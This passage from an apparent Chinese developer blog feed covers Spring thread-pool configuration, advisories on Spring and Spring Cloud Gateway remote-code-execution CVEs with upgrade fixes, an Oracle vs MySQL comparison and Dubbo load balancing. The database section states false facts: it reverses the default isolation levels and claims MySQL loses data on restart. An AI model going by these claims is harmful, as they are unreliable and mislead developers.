class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="meta">@EnableAsync</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AsyncThreadConfig</span> <span class="keyword">implements</span> <span class="title">AsyncConfigurer</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义<span class="doctag">@Async</span>默认的线程池</span></span><br><span class="line"><span class="comment">     * ThreadPoolTaskExecutor不是完全被IOC容器管理的bean,可以在方法上加上<span class="doctag">@Bean</span>注解交给容器管理,这样可以将taskExecutor.initialize()方法调用去掉，容器会自动调用</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Executor <span class="title">getAsyncExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> processors = Runtime.getRuntime().availableProcessors();</span><br><span class="line">        <span class="comment">//常用的执行器</span></span><br><span class="line">        <span class="comment">//ThreadPoolTaskExecutor taskExecutor = new ThreadPoolTaskExecutor();</span></span><br><span class="line">        <span class="comment">//可以查看线程池参数的自定义执行器</span></span><br><span class="line">        ThreadPoolTaskExecutor taskExecutor = <span class="keyword">new</span> VisiableThreadPoolTaskExecutor();</span><br><span class="line">        <span class="comment">//核心线程数</span></span><br><span class="line">        taskExecutor.setCorePoolSize(<span class="number">1</span>);</span><br><span class="line">        taskExecutor.setMaxPoolSize(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//线程队列最大线程数,默认：50</span></span><br><span class="line">        taskExecutor.setQueueCapacity(<span class="number">50</span>);</span><br><span class="line">        <span class="comment">//线程名称前缀</span></span><br><span class="line">        taskExecutor.setThreadNamePrefix(<span class="string">"default-ljw-"</span>);</span><br><span class="line">        taskExecutor.setRejectedExecutionHandler(<span class="keyword">new</span> ThreadPoolExecutor.CallerRunsPolicy());</span><br><span class="line">        <span class="comment">//执行初始化(重要)</span></span><br><span class="line">        taskExecutor.initialize();</span><br><span class="line">        <span class="keyword">return</span> taskExecutor;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 异步方法执行的过程中抛出的异常捕获</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AsyncUncaughtExceptionHandler <span class="title">getAsyncUncaughtExceptionHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (ex, method, params) -&gt;</span><br><span class="line">                log.error(<span class="string">"线程池执行任务发送未知错误,执行方法：&#123;&#125;"</span>, method.getName(), ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 使用默认线程池</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">@Async</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">   Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">   <span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">       log.info(<span class="string">"使用默认线程池，耗时："</span> + (end - start) + <span class="string">"毫秒"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="Async使用指定线程池"><a href="#Async使用指定线程池" class="headerlink" title="@Async使用指定线程池"></a>@Async使用指定线程池</h3><ul><li>由于业务需要，根据业务不同需要不同的线程池</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AsyncThreadConfig</span> <span class="keyword">implements</span> <span class="title">AsyncConfigurer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** size */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer SIZE = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** qsize */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer QSIZE = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** sec */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer SEC = <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@description</span> 自定义任务线程池.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Executor <span class="title">myAsync</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ThreadPoolTaskExecutor executor = <span class="keyword">new</span> ThreadPoolTaskExecutor();</span><br><span class="line">        <span class="comment">//最大线程数</span></span><br><span class="line">        executor.setMaxPoolSize(SIZE);</span><br><span class="line">        <span class="comment">//核心线程数</span></span><br><span class="line">        executor.setCorePoolSize(SIZE);</span><br><span class="line">        <span class="comment">//任务队列的大小</span></span><br><span class="line">        executor.setQueueCapacity(QSIZE);</span><br><span class="line">        <span class="comment">//线程前缀名</span></span><br><span class="line">        executor.setThreadNamePrefix(<span class="string">"async-thread-"</span>);</span><br><span class="line">        <span class="comment">//线程存活时间</span></span><br><span class="line">        executor.setKeepAliveSeconds(SEC);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 拒绝处理策略</span></span><br><span class="line"><span class="comment">         * CallerRunsPolicy()：交由调用方线程运行，比如 main 线程。</span></span><br><span class="line"><span class="comment">         * AbortPolicy()：直接抛出异常。</span></span><br><span class="line"><span class="comment">         * DiscardPolicy()：直接丢弃。</span></span><br><span class="line"><span class="comment">         * DiscardOldestPolicy()：丢弃队列中最老的任务。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        executor.setRejectedExecutionHandler(<span class="keyword">new</span> ThreadPoolExecutor.DiscardOldestPolicy());</span><br><span class="line">        <span class="comment">//线程初始化</span></span><br><span class="line">        executor.initialize();</span><br><span class="line">        <span class="keyword">return</span> executor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用</strong>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 使用默认线程池</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">@Async</span>(<span class="string">"myAsync"</span>)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">   Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">   <span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">       log.info(<span class="string">"使用默认线程池，耗时："</span> + (end - start) + <span class="string">"毫秒"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="Scheduled"><a href="#Scheduled" class="headerlink" title="@Scheduled"></a>@Scheduled</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Spring提供的用于定时任务的注解。</p><h3 id="单线程原理"><a href="#单线程原理" class="headerlink" title="单线程原理"></a>单线程原理</h3><p>@Scheduled未指定线程池默认使用默认单线程(java自己实现的线程池newSingleThreadScheduledExecutor)去执行定时任务，<strong>当项目中定时器多起来，这是该线程如果执行别的定时任务阻塞，则会导致其余的定时任务执行时间间隔变长，未按指定延迟时间执行定时任务，可以使用@Async解决。</strong></p><p><strong>源码:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ScheduledExecutorService <span class="title">initScheduledExecutor</span><span class="params">(@Nullable ScheduledExecutorService scheduledExecutor)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (scheduledExecutor != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>.scheduledExecutor = scheduledExecutor;</span><br><span class="line"><span class="keyword">this</span>.enterpriseConcurrentScheduler = (managedScheduledExecutorServiceClass != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">managedScheduledExecutorServiceClass.isInstance(scheduledExecutor));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">this</span>.scheduledExecutor = Executors.newSingleThreadScheduledExecutor();</span><br><span class="line"><span class="keyword">this</span>.enterpriseConcurrentScheduler = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.scheduledExecutor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Scheduled使用"><a href="#Scheduled使用" class="headerlink" title="@Scheduled使用"></a>@Scheduled使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Async</span>(<span class="string">"myAsync"</span>)</span><br><span class="line"><span class="meta">@Scheduled</span>(cron = <span class="string">"0 0/3 * * * ?"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateData</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    dataService.updateData();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注:启动类需添加注解<code>@EnableScheduling</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Async </tag>
            
            <tag> Scheduled </tag>
            
            <tag> 线程池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring远程命令执行漏洞</title>
      <link href="/2022/03/31/Spring%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/03/31/Spring%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="Spring远程命令执行漏洞"><a href="#Spring远程命令执行漏洞" class="headerlink" title="Spring远程命令执行漏洞"></a>Spring远程命令执行漏洞</h3><p>转载地址:<a href="https://mp.weixin.qq.com/s/BnF8CWuUxNliCoa260bEaA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/BnF8CWuUxNliCoa260bEaA</a></p><p> Spring RCE （远程代码执行漏洞）已被官方证实。</p><ul><li><p>国家信息安全漏洞平台：<a href="https://mp.weixin.qq.com/s/BnF8CWuUxNliCoa260bEaA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/BnF8CWuUxNliCoa260bEaA</a></p></li><li><p>CVE: <a href="https://tanzu.vmware.com/security/cve-2022-22965" target="_blank" rel="noopener">https://tanzu.vmware.com/security/cve-2022-22965</a></p></li></ul><h3 id="安全公告编号-CNTA-2022-0009"><a href="#安全公告编号-CNTA-2022-0009" class="headerlink" title="安全公告编号:CNTA-2022-0009"></a>安全公告编号<strong>:CNTA-2022-0009</strong></h3><p>2022年3月30日，国家信息安全漏洞共享平台（CNVD）收录了Spring框架远程命令执行漏洞（CNVD-2022-23942）。攻击者利用该漏洞，可在未授权的情况下远程执行命令。目前，漏洞利用细节已大范围公开，Spring官方已发布补丁修复该漏洞。CNVD建议受影响的单位和用户立即更新至最新版本。</p><h3 id="漏洞情况分析"><a href="#漏洞情况分析" class="headerlink" title="漏洞情况分析"></a>漏洞情况分析</h3><p>Spring框架（Framework）是一个开源的轻量级J2EE应用程序开发框架，提供了IOC、AOP及MVC等功能，解决了程序人员在开发中遇到的常见问题，提高了应用程序开发便捷度和软件系统构建效率。</p><p>2022年3月30日，CNVD平台接收到蚂蚁科技集团股份有限公司报送的Spring框架远程命令执行漏洞。由于Spring框架存在处理流程缺陷，攻击者可在远程条件下，实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。使用Spring框架或衍生框架构建网站等应用，且同时使用JDK版本在9及以上版本的，易受此漏洞攻击影响。</p><p>CNVD对该漏洞的综合评级为“高危”。</p><h3 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a><strong>漏洞影响范围</strong></h3><p>漏洞影响的产品版本包括：</p><p>版本低于5.3.18和5.2.20的Spring框架或其衍生框架构建的网站或应用。</p><h3 id="漏洞处置建议"><a href="#漏洞处置建议" class="headerlink" title="漏洞处置建议"></a>漏洞处置建议</h3><p>目前，Spring官方已发布新版本完成漏洞修复，CNVD建议受漏洞影响的产品（服务）厂商和信息系统运营者尽快进行自查，并及时升级至最新版本：</p><p><a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement" target="_blank" rel="noopener">https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement</a></p><p>附：参考链接：</p><p><a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement" target="_blank" rel="noopener">https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement</a></p><p><a href="https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18" target="_blank" rel="noopener">https://github.com/spring-projects/spring-framework/compare/v5.3.17...v5.3.18</a></p>]]></content>
      
      
      <categories>
          
          <category> spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GateWay漏洞</title>
      <link href="/2022/03/15/GateWay%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/03/15/GateWay%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>2022年3月1日，Spring官方发布了关于Spring Cloud Gateway的两个CVE漏洞，分别为<strong>CVE-2022-22946</strong>与<strong>CVE-2022-22947</strong>：</p><h3 id="漏洞1：Spring-Cloud-Gateway-远程代码执行漏洞（CVE-2022-22947）"><a href="#漏洞1：Spring-Cloud-Gateway-远程代码执行漏洞（CVE-2022-22947）" class="headerlink" title="漏洞1：Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）"></a>漏洞1：Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）</h3><p>3 月 1 日，VMware 官方发布安全公告，声明对 Spring Cloud Gateway 中的一处命令注入漏洞进行了修复，漏洞编号为 CVE-2022-22947：</p><p><a href="https://tanzu.vmware.com/security/cve-2022-22947" target="_blank" rel="noopener">https://tanzu.vmware.com/security/cve-2022-22947</a></p><p>漏洞描述</p><p>使用 Spring Cloud Gateway 的应用如果对外暴露了 Gateway Actuator 端点时，则可能存在被 CVE-2022-22947 漏洞利用的风险。攻击者可通过利用此漏洞执行 SpEL 表达式，允许在远程主机上进行任意远程执行。，获取系统权限。</p><p>影响范围</p><p>漏洞利用的前置条件：</p><p>除了 Spring Cloud Gateway 外，程序还用到了 Spring Boot Actuator 组件（它用于对外提供 /actuator/ 接口）；<br>Spring 配置对外暴露 gateway 接口，如 application.properties 配置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 默认为true</span><br><span class="line"></span><br><span class="line">management.endpoint.gateway.enabled&#x3D;true</span><br><span class="line"></span><br><span class="line"># 以逗号分隔的一系列值，默认为 health</span><br><span class="line"></span><br><span class="line"># 若包含 gateway 即表示对外提供 Spring Cloud Gateway 接口</span><br><span class="line"></span><br><span class="line">management.endpoints.web.exposure.include&#x3D;gateway</span><br></pre></td></tr></table></figure><p>漏洞影响的 Spring Cloud Gateway 版本范围：</p><p>Spring Cloud Gateway 3.1.x &lt; 3.1.1<br>Spring Cloud Gateway 3.0.x &lt; 3.0.7<br>其他旧的、不受支持的 Spring Cloud Gateway 版本<br>解决方案</p><p>更新升级 Spring Cloud Gateway 到以下安全版本：</p><p>Spring Cloud Gateway 3.1.1<br>Spring Cloud Gateway 3.0.7<br>或者在不考虑影响业务的情况下禁用 Gateway actuator 接口：</p><p>在application.properties 中设置 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">management.endpoint.gateway.enabled&#x3D;false</span><br></pre></td></tr></table></figure><h3 id="漏洞2：CVE-2022-22946：Spring-Cloud-Gateway-HTTP2-不安全的-TrustManager"><a href="#漏洞2：CVE-2022-22946：Spring-Cloud-Gateway-HTTP2-不安全的-TrustManager" class="headerlink" title="漏洞2：CVE-2022-22946：Spring Cloud Gateway HTTP2 不安全的 TrustManager"></a>漏洞2：CVE-2022-22946：Spring Cloud Gateway HTTP2 不安全的 TrustManager</h3><p>漏洞描述</p><p>使用配置为启用 HTTP2 且未设置密钥存储或受信任证书的 Spring Cloud Gateway 的应用程序将被配置为使用不安全的 TrustManager。这使得网关能够使用无效或自定义证书连接到远程服务。</p><p>影响范围</p><p>Spring Cloud Gateway = 3.1.0</p><p>解决方案</p><p>官方已经发布安全版本，请升级到3.1.1+</p><p>参考资料</p><p>官方已经发布安全版本，请升级到3.1.1+</p><p><a href="https://tanzu.vmware.com/security/cve-2022-22946" target="_blank" rel="noopener">https://tanzu.vmware.com/security/cve-2022-22946</a><br><a href="https://tanzu.vmware.com/security/cve-2022-22947" target="_blank" rel="noopener">https://tanzu.vmware.com/security/cve-2022-22947</a></p>]]></content>
      
      
      <categories>
          
          <category> GateWay </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GateWay </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle与Mysql数据库区别</title>
      <link href="/2022/02/23/Oracle%E4%B8%8EMysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/02/23/Oracle%E4%B8%8EMysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p><strong>(1) 对事务的提交</strong></p><p>MySQL默认是自动提交，而Oracle默认不自动提交，需要用户手动提交，需要在写commit;指令或者点击commit按钮</p><p><strong>(2) 分页查询</strong></p><p>MySQL是直接在SQL语句中写”select… from …where…limit x, y”,有limit就可以实现分页;而Oracle则是需要用到伪列ROWNUM和嵌套查询</p><p>oracle:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span></span><br><span class="line">(<span class="keyword">select</span> <span class="keyword">rownum</span> r,t.* <span class="keyword">from</span></span><br><span class="line">(<span class="keyword">select</span> * <span class="keyword">from</span> T_ACCOUNT <span class="keyword">order</span> <span class="keyword">by</span> usenum <span class="keyword">desc</span>) t</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">rownum</span>&lt;=<span class="number">20</span> )</span><br><span class="line"><span class="keyword">where</span> r&gt; <span class="number">10</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span></span><br><span class="line">(<span class="keyword">select</span> row_number() <span class="keyword">over</span>(<span class="keyword">order</span> <span class="keyword">by</span> usenum <span class="keyword">desc</span> )</span><br><span class="line">rownumber,usenum <span class="keyword">from</span> T_ACCOUNT)</span><br><span class="line"><span class="keyword">where</span> rownumber&gt;<span class="number">10</span> <span class="keyword">and</span> rownumber&lt;=<span class="number">20</span></span><br></pre></td></tr></table></figure><p>(3) 关联查询</p><p>MySQL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ow.id,ow.name,ac.year ,ac.month,ac.money</span><br><span class="line"><span class="keyword">FROM</span> T_OWNERS ow <span class="keyword">left</span> <span class="keyword">join</span> T_ACCOUNT ac</span><br><span class="line"><span class="keyword">on</span> ow.id=ac.owneruuid</span><br></pre></td></tr></table></figure><p>Oracle</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ow.id,ow.name,ac.year ,ac.month,ac.money <span class="keyword">FROM</span></span><br><span class="line">T_OWNERS ow,T_ACCOUNT ac</span><br><span class="line"><span class="keyword">WHERE</span> ow.id=ac.owneruuid(+)</span><br></pre></td></tr></table></figure><p>如果是左外连接，就在右表所在的条件一端填上(+)</p><p>(4) 事务隔离级别</p><p>MySQL是read commited的隔离级别，而Oracle是repeatable read的隔离级别，同时二者都支持serializable串行化事务隔离级别，可以实现最高级别的</p><p>读一致性。每个session提交后其他session才能看到提交的更改。Oracle通过在undo表空间中构造多版本数据块来实现读一致性，每个session</p><p>查询时，如果对应的数据块发生变化，Oracle会在undo表空间中为这个session构造它查询时的旧的数据块</p><p>MySQL没有类似Oracle的构造多版本数据块的机制，只支持read commited的隔离级别。一个session读取数据时，其他session不能更改数据，但</p><p>可以在表最后插入数据。session更新数据时，要加上排它锁，其他session无法访问数据</p><p>(5) 对事务的支持</p><p>MySQL在innodb存储引擎的行级锁的情况下才可支持事务，而Oracle则完全支持事务</p><p>(6) 保存数据的持久性</p><p>MySQL是在数据库更新或者重启，则会丢失数据，Oracle把提交的sql操作线写入了在线联机日志文件中，保持到了磁盘上，可以随时恢复</p>]]></content>
      
      
      <categories>
          
          <category> Oracle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Oracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dubbo四种负载均衡算法</title>
      <link href="/2022/02/03/Dubbo%E5%9B%9B%E7%A7%8D%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95/"/>
      <url>/2022/02/03/Dubbo%E5%9B%9B%E7%A7%8D%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="Dubbo四种负载均衡算法"><a href="#Dubbo四种负载均衡算法" class="headerlink" title="Dubbo四种负载均衡算法"></a>Dubbo四种负载均衡算法</h2><h3 id="整体架构图"><a href="#整体架构图" class="headerlink" title="整体架构图"></a>整体架构图</h3><p>可以看出抽象的负载均衡下的类分为4个，这4个类表示了4种负载均衡策略，分别是一致性Hash均衡算法、随机调用法、轮询法、最少活动调用法</p><p><img src="../img/Dubbo/DubboLoadBalanced0.png" alt=""></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="RandomLoadBalance"><a href="#RandomLoadBalance" class="headerlink" title="RandomLoadBalance"></a>RandomLoadBalance</h4><p>随机调用负载均衡，该类实现了抽象的AbstractLoadBalance接口,重写了doSelect方法，看方法的细节就是首先遍历每个提供服务的机器，获取每个服务的权重，然后累加权重值，判断每个服务的提供者权重是否相同，如果每个调用者的权重不相同，并且每个权重大于0，那么就会根据权重的总值生成一个随机数，再用这个随机数，根据调用者的数量每次减去调用者的权重，直到计算出当前的服务提供者随机数小于0，就选择那个提供者！另外，如果每个机器的权重的都相同，那么权重就不会参与计算，直接选择随机算法生成的某一个选择，完全随机。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RandomLoadBalance</span> <span class="keyword">extends</span> <span class="title">AbstractLoadBalance</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NAME = <span class="string">"random"</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> &lt;T&gt; <span class="function">Invoker&lt;T&gt; <span class="title">doSelect</span><span class="params">(List&lt;Invoker&lt;T&gt;&gt; invokers, URL url, Invocation invocation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = invokers.size(); <span class="comment">// Number of invokers</span></span><br><span class="line">        <span class="keyword">int</span> totalWeight = <span class="number">0</span>; <span class="comment">// The sum of weights</span></span><br><span class="line">        <span class="keyword">boolean</span> sameWeight = <span class="keyword">true</span>; <span class="comment">// Every invoker has the same weight?</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> weight = getWeight(invokers.get(i), invocation);</span><br><span class="line">            totalWeight += weight; <span class="comment">// Sum</span></span><br><span class="line">            <span class="keyword">if</span> (sameWeight &amp;&amp; i &gt; <span class="number">0</span></span><br><span class="line">                    &amp;&amp; weight != getWeight(invokers.get(i - <span class="number">1</span>), invocation)) &#123;</span><br><span class="line">                sameWeight = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (totalWeight &gt; <span class="number">0</span> &amp;&amp; !sameWeight) &#123;</span><br><span class="line">            <span class="comment">// If (not every invoker has the same weight &amp; at least one invoker's weight&gt;0), select randomly based on totalWeight.</span></span><br><span class="line">            <span class="keyword">int</span> offset = random.nextInt(totalWeight);</span><br><span class="line">            <span class="comment">// 